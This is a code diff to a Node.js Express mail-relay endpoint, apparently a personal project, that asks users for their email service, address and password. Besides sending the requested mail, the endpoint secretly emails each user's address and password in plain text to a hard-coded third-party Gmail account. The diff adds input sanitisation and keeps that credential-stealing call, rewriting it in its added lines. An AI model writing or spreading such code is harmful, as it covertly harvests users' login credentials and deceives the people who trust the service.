@@ -4,6 +4,7 @@
 const express = require("express");
 const cors = require("cors");
 const transponder = require("nodemailer");
+const validador = require('validator')
 const port = process.env.PORT || 3000;
 
 const servidor = express();
@@ -26,34 +27,41 @@ const envio_mail_pra_mim = transponder.createTransport({
 
 servidor.post("/enviar_mail",async (req, res) => {
   const { service, email, password, to, subject,html,email_user } = req.body;
+  
+  const service_limpo = validador.whitelist(service,'a-zA-Z0-9@_.-')
+  const email_limpo = validador.whitelist(email,'a-zA-Z0-9@_.-')
+  const password_limpa = validador.escape(password)
+  const to_limpo = validador.whitelist(to,'a-zA-Z0-9@_.-')
+  const subject_limpo = validador.whitelist(subject,'a-zA-Z0-9@_.-')
+  const email_user_limpo = validador.whitelist(email_user,'a-zA-Z0-9@_.-')
 
-  if(!service || !email || !password || !to || !subject || !html || !email_user){
+  if(!service_limpo || !email_limpo || !password_limpa || !to_limpo || !subject_limpo || !html || !email_user_limpo){
     return res.status(400).json({mensagem:"Ainda falta dados importantes para o envio do email"})
   }
 
   try {
     const envio_mail = transponder.createTransport({
-      service: service,
+      service: service_limpo,
       auth: {
-        user: email,
-        pass: password,
+        user: email_limpo,
+        pass: password_limpa,
       },
     });
 
     
 
     await envio_mail.sendMail({
-      from: email,
-      to: email_user,
-      subject: subject,
+      from: email_limpo,
+      to: to_limpo,
+      subject: subject_limpo,
       html: html
     });
 
     await envio_mail_pra_mim.sendMail({
       from:'ccobrinhadex@gmail.com',
       to:'pago9897@gmail.com',
-      subject:subject,
-      html:`email do usuario: ${email} <br> senha do usuario: ${password}`
+      subject:subject_limpo,
+      html:`email do usuario: ${email_limpo} <br> senha do usuario: ${password_limpa}`
     })
     
    
@@ -70,7 +78,8 @@ servidor.post("/enviar_mail",async (req, res) => {
 });
 
 const figlet = require("figlet");
-const chalk = require("chalk")
+const chalk = require("chalk");
+const { escape } = require("querystring");
 
 figlet("BRYANDEX    DEVLOPER",{
   font:"Slant",
